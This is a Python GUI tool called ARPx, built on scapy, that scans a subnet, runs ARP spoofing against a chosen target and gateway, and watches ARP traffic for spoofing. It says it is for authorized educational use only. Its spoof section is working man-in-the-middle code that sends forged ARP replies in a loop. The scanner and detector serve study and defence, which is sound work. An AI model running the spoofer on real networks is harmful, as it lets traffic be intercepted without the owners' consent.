#!/usr/bin/env python3
"""
ARPx - ARP Network Security Tool (Pro Version)
Purpose: Educational demonstration of ARP scanning, spoofing & detection
DISCLAIMER: For authorized networks and educational use only.
"""

import tkinter as tk
from tkinter import ttk, messagebox
from scapy.all import ARP, Ether, srp, send, sendp, sniff, getmacbyip
from threading import Thread
import time
import datetime

# ─────────────────────────────────────────────
#  GLOBAL STATE
# ─────────────────────────────────────────────
running   = False
detecting = False

# ─────────────────────────────────────────────
#  THREAD-SAFE GUI HELPERS
#  ALL gui updates must go through root.after()
# ─────────────────────────────────────────────
def log(message):
    def _do():
        timestamp = datetime.datetime.now().strftime("%H:%M:%S")
        output.configure(state=tk.NORMAL)
        output.insert(tk.END, f"[{timestamp}] {message}\n")
        output.see(tk.END)
        output.configure(state=tk.DISABLED)
    root.after(0, _do)

def safe_insert_row(ip, mac, tag=""):
    def _do():
        if tag:
            tree.insert("", "end", values=(ip, mac), tags=(tag,))
        else:
            tree.insert("", "end", values=(ip, mac))
    root.after(0, _do)

def safe_clear_tree():
    root.after(0, lambda: [tree.delete(r) for r in tree.get_children()])

def safe_btn(btn, state):
    root.after(0, lambda: btn.configure(state=state))

# ─────────────────────────────────────────────
#  NETWORK UTILITY
# ─────────────────────────────────────────────
def get_mac(ip):
    try:
        return getmacbyip(ip)
    except Exception:
        return None

# ─────────────────────────────────────────────
#  SCAN
# ─────────────────────────────────────────────
def _scan_worker(network):
    safe_btn(scan_btn, tk.DISABLED)
    safe_clear_tree()
    log(f"Scanning {network} ...")
    try:
        pkt    = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network)
        result = srp(pkt, timeout=3, verbose=0)[0]
        if result:
            for _, rcv in result:
                safe_insert_row(rcv.psrc, rcv.hwsrc)
            log(f"Scan complete — {len(result)} host(s) found.")
        else:
            log("No hosts found. Check subnet or run as sudo.")
    except PermissionError:
        log("[ERROR] Run with: sudo python3 arpx_pro.py")
    except Exception as e:
        log(f"[ERROR] Scan failed: {e}")
    finally:
        safe_btn(scan_btn, tk.NORMAL)

def scan_network():
    network = subnet_entry.get().strip()
    if not network:
        messagebox.showwarning("Input Error", "Enter subnet e.g. 192.168.1.0/24")
        return
    Thread(target=_scan_worker, args=(network,), daemon=True).start()

# ─────────────────────────────────────────────
#  SPOOF
# ─────────────────────────────────────────────
def _send_spoof(target, spoof_ip):
    mac = get_mac(target)
    if mac:
        pkt = Ether(dst=mac) / ARP(op=2, pdst=target, hwdst=mac, psrc=spoof_ip)
        sendp(pkt, verbose=0)

def _restore_arp(target, real_ip):
    tmac = get_mac(target)
    rmac = get_mac(real_ip)
    if tmac and rmac:
        pkt = Ether(dst=tmac) / ARP(op=2, pdst=target, hwdst=tmac,
                                     psrc=real_ip, hwsrc=rmac)
        sendp(pkt, count=5, verbose=0)
        log(f"ARP restored for {target}.")

def _spoof_worker(target, gateway):
    global running
    log(f"Spoofing started | Target: {target}  Gateway: {gateway}")
    try:
        while running:
            _send_spoof(target, gateway)
            _send_spoof(gateway, target)
            log(f"[+] Packets sent → {target} & {gateway}")
            time.sleep(2)
    finally:
        log("Stopping — restoring ARP tables ...")
        _restore_arp(target, gateway)
        _restore_arp(gateway, target)
        safe_btn(spoof_start_btn, tk.NORMAL)
        safe_btn(spoof_stop_btn,  tk.DISABLED)

def start_spoof():
    global running
    target  = target_entry.get().strip()
    gateway = gateway_entry.get().strip()
    if not target or not gateway:
        messagebox.showwarning("Input Error", "Enter both Target IP and Gateway IP")
        return
    if running:
        log("Spoofing already running.")
        return
    running = True
    safe_btn(spoof_start_btn, tk.DISABLED)
    safe_btn(spoof_stop_btn,  tk.NORMAL)
    Thread(target=_spoof_worker, args=(target, gateway), daemon=True).start()

def stop_spoof():
    global running
    running = False

# ─────────────────────────────────────────────
#  DETECT
# ─────────────────────────────────────────────
arp_table = {}

def _process_packet(packet):
    if not packet.haslayer(ARP) or packet[ARP].op != 2:
        return
    src_ip  = packet[ARP].psrc
    src_mac = packet[ARP].hwsrc
    if src_ip in arp_table:
        if arp_table[src_ip] != src_mac:
            old = arp_table[src_ip]
            log(f"[!! ALERT !!] SPOOF: {src_ip} changed {old} -> {src_mac}")
            safe_insert_row(f"!! {src_ip}", f"{old}  ->  {src_mac}", tag="alert")
            arp_table[src_ip] = src_mac
        else:
            log(f"[OK] {src_ip} at {src_mac} (consistent)")
    else:
        arp_table[src_ip] = src_mac
        log(f"[LEARN] {src_ip} is at {src_mac}")

def _detect_worker():
    log("Detection started — sniffing ARP traffic ...")
    sniff(filter="arp", prn=_process_packet, store=0,
          stop_filter=lambda _: not detecting)
    log("Detection stopped.")
    safe_btn(detect_start_btn, tk.NORMAL)
    safe_btn(detect_stop_btn,  tk.DISABLED)

def start_detect():
    global detecting
    if detecting:
        log("Detection already running.")
        return
    detecting = True
    safe_btn(detect_start_btn, tk.DISABLED)
    safe_btn(detect_stop_btn,  tk.NORMAL)
    Thread(target=_detect_worker, daemon=True).start()

def stop_detect():
    global detecting
    detecting = False

# ─────────────────────────────────────────────
#  GUI
# ─────────────────────────────────────────────
BG       = "#0d0d0d"
FG       = "#00ff88"
ACCENT   = "#ff3355"
YELLOW   = "#ffcc00"
BTN_BG   = "#1a1a2e"
ENTRY_BG = "#111111"
FONT     = ("Courier New", 10)
BOLD     = ("Courier New", 10, "bold")
TITLE_F  = ("Courier New", 14, "bold")

root = tk.Tk()
root.title("ARPx — Network Security Tool  |  Pro Version")
root.geometry("700x700")
root.configure(bg=BG)
root.resizable(False, False)

tk.Label(root, text="◈  ARPx  —  ARP Security Analyzer  ◈",
         font=TITLE_F, fg=FG, bg=BG).pack(pady=(12, 2))
tk.Label(root, text="For authorized educational use only",
         font=("Courier New", 8), fg="#444444", bg=BG).pack()
ttk.Separator(root).pack(fill="x", padx=20, pady=8)

# SCAN
f_scan = tk.LabelFrame(root, text="  [ NETWORK SCAN ]  ",
                       fg=FG, bg=BG, font=BOLD, bd=1, relief="groove")
f_scan.pack(fill="x", padx=20, pady=4)
tk.Label(f_scan, text="Subnet (CIDR):", fg=FG, bg=BG, font=FONT).grid(
    row=0, column=0, padx=8, pady=6, sticky="w")
subnet_entry = tk.Entry(f_scan, width=24, bg=ENTRY_BG, fg=FG,
                        insertbackground=FG, font=FONT, relief="flat", bd=4)
subnet_entry.insert(0, "192.168.1.0/24")
subnet_entry.grid(row=0, column=1, padx=4)
scan_btn = tk.Button(f_scan, text="▶  Scan Network", command=scan_network,
                     bg=BTN_BG, fg=FG, font=FONT, relief="flat",
                     cursor="hand2", activebackground=FG, activeforeground="black", padx=10)
scan_btn.grid(row=0, column=2, padx=10)

# SPOOF
f_spoof = tk.LabelFrame(root, text="  [ ARP SPOOF ]  ",
                        fg=ACCENT, bg=BG, font=BOLD, bd=1, relief="groove")
f_spoof.pack(fill="x", padx=20, pady=4)
tk.Label(f_spoof, text="Target IP:", fg=FG, bg=BG, font=FONT).grid(
    row=0, column=0, padx=8, pady=4, sticky="w")
target_entry = tk.Entry(f_spoof, width=17, bg=ENTRY_BG, fg=FG,
                        insertbackground=FG, font=FONT, relief="flat", bd=4)
target_entry.grid(row=0, column=1, padx=4)
tk.Label(f_spoof, text="Gateway IP:", fg=FG, bg=BG, font=FONT).grid(
    row=0, column=2, padx=8, sticky="w")
gateway_entry = tk.Entry(f_spoof, width=17, bg=ENTRY_BG, fg=FG,
                         insertbackground=FG, font=FONT, relief="flat", bd=4)
gateway_entry.grid(row=0, column=3, padx=4)
spoof_start_btn = tk.Button(f_spoof, text="▶  Start Spoof", command=start_spoof,
                             bg=ACCENT, fg="white", font=BOLD, relief="flat",
                             cursor="hand2", padx=10)
spoof_start_btn.grid(row=1, column=0, columnspan=2, padx=8, pady=6, sticky="ew")
spoof_stop_btn = tk.Button(f_spoof, text="■  Stop Spoof", command=stop_spoof,
                            bg=BTN_BG, fg=FG, font=FONT, relief="flat",
                            cursor="hand2", state=tk.DISABLED, padx=10)
spoof_stop_btn.grid(row=1, column=2, columnspan=2, padx=8, pady=6, sticky="ew")

# DETECT
f_detect = tk.LabelFrame(root, text="  [ ARP DETECT ]  ",
                         fg=YELLOW, bg=BG, font=BOLD, bd=1, relief="groove")
f_detect.pack(fill="x", padx=20, pady=4)
detect_start_btn = tk.Button(f_detect, text="▶  Start Detect", command=start_detect,
                              bg=BTN_BG, fg=YELLOW, font=FONT, relief="flat",
                              cursor="hand2", padx=10)
detect_start_btn.grid(row=0, column=0, padx=10, pady=6)
detect_stop_btn = tk.Button(f_detect, text="■  Stop Detect", command=stop_detect,
                             bg=BTN_BG, fg=FG, font=FONT, relief="flat",
                             cursor="hand2", state=tk.DISABLED, padx=10)
detect_stop_btn.grid(row=0, column=1, padx=10, pady=6)
tk.Label(f_detect, text="Monitors ARP traffic & alerts on MAC changes",
         fg="#444444", bg=BG, font=("Courier New", 8)).grid(row=0, column=2, padx=10)

# TABLE
ttk.Separator(root).pack(fill="x", padx=20, pady=6)
style = ttk.Style()
style.theme_use("clam")
style.configure("Treeview", background=BG, fieldbackground=BG,
                foreground=FG, font=FONT, rowheight=24)
style.configure("Treeview.Heading", background=BTN_BG, foreground=FG,
                font=BOLD)
style.map("Treeview", background=[("selected", "#1a3a2a")])
tree = ttk.Treeview(root, columns=("IP", "MAC"), show="headings", height=6)
tree.heading("IP",  text="IP Address")
tree.heading("MAC", text="MAC Address")
tree.column("IP",  width=200, anchor="center")
tree.column("MAC", width=440, anchor="center")
tree.tag_configure("alert", foreground=ACCENT, font=BOLD)
tree.pack(padx=20, fill="x")

# LOG
ttk.Separator(root).pack(fill="x", padx=20, pady=4)
tk.Label(root, text="[ CONSOLE LOG ]", fg="#444444", bg=BG,
         font=("Courier New", 8)).pack(anchor="w", padx=22)
out_frame = tk.Frame(root, bg=BG)
out_frame.pack(fill="both", expand=True, padx=20, pady=(0, 12))
scrollbar = tk.Scrollbar(out_frame)
scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
output = tk.Text(out_frame, height=8, bg="#050505", fg="#00cc66",
                 font=("Courier New", 9), relief="flat",
                 yscrollcommand=scrollbar.set, state=tk.DISABLED)
output.pack(side=tk.LEFT, fill="both", expand=True)
scrollbar.config(command=output.yview)

log("ARPx initialized. Ready.")
log("Run with:  sudo python3 arpx_pro.py")

root.mainloop()
